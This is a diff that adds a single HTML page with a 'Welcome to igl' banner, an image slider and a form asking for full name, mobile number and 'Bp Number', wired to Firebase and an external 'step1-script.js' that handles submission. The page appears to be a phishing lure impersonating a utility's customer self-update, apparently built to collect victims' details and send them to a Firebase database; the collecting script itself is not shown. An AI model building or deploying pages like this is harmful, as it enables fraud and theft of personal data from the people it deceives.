@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Requested-by-self-update</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      text-align: center;
+    }
+
+    .container {
+      margin: 20px auto;
+      max-width: 360px;
+      background-color: #e6f3ff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 2px solid #cce0ff;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #007bff;
+      background-color: #e6f0ff;
+    }
+
+    button {
+      width: 95%;
+      padding: 10px;
+      margin-top: 12px;
+      background-color: #0066ff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0052cc;
+    }
+
+    #cac {
+      text-transform: uppercase;
+    }
+
+    .welcome-text {
+      font-size: 16px;
+      color: #fff;
+      background-color: #0080fe;
+      padding: 8px 12px;
+      margin: 8px auto;
+      border-radius: 8px;
+      display: inline-block;
+    }
+
+    .slider-container {
+      width: 100%;
+      max-width: 500px;
+      margin: 20px auto;
+      position: relative;
+    }
+
+    .slider-image {
+      width: 100%;
+      height: auto;
+      display: none;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Full-width abc -->
+  <img src="igimg.jpg" alt="Indee" style="width: 100%; height: auto; display: block;" />
+
+  <!-- Welcome message -->
+  <div class="welcome-text">Welcome to igl</div>
+
+  <!-- Form container -->
+  <div class="container">
+    <form id="ududip007">
+      <input type="text" id="aname" name="fullname" placeholder="Full Name" required />
+      <input type="tel" id="bmobile" name="mobile" placeholder="Mobile Number" pattern="[0-9]{10}" required />
+      <input type="text" id="cac" name="vnum" placeholder="Bp Number" required />
+      <button type="submit">Proceed</button>
+    </form>
+  </div>
+
+  <!-- Bottom Slider -->
+  <div class="slider-container">
+    <img class="slider-image" src="img1.jpg" alt="Slide 1" />
+    <img class="slider-image" src="img2.jpeg" alt="Slide 2" />
+    <img class="slider-image" src="img3.jpeg" alt="Slide 3" />
+    <img class="slider-image" src="img4.jpeg" alt="Slide 4" />
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <!-- Firebase Config -->
+  <script src="firebase-config.js"></script>
+
+  <!-- Submission Script -->
+  <script defer src="step1-script.js"></script>
+
+  <!-- Slider Script -->
+  <script>
+    let slideIndex = 0;
+    const slides = document.querySelectorAll(".slider-image");
+
+    function showSlides() {
+      slides.forEach((img, index) => {
+        img.style.display = index === slideIndex ? "block" : "none";
+      });
+      slideIndex = (slideIndex + 1) % slides.length;
+      setTimeout(showSlides, 3000);
+    }
+
+    showSlides();
+  </script>
+</body>
+</html>
